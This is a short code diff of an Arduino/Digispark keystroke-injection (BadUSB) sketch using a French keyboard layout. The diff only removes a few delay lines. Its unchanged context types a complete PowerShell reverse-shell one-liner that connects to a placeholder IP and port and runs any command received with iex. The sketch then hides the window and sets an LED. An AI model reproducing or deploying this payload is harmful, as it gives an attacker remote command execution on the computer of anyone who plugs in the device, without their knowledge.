@@ -21,9 +21,6 @@ void loop() {
   DigiKeyboardFr.println("powershell");
   DigiKeyboardFr.delay(time_run);
   DigiKeyboardFr.println("cls;$c=New-Object System.Net.Sockets.TCPClient('"IP"',"PORT");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$y=(iex $d 2>&1|Out-String);$x=([text.encoding]::ASCII).GetBytes($y);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close();exit");
-  DigiKeyboardFr.delay(time_default);
-  DigiKeyboardFr.sendKeyStroke(0);
-  DigiKeyboardFr.delay(time_default);
   DigiKeyboardFr.sendKeyStroke(KEY_ARROW_DOWN, MOD_GUI_LEFT);
   digitalWrite(led_id, HIGH);
   for (;;) {
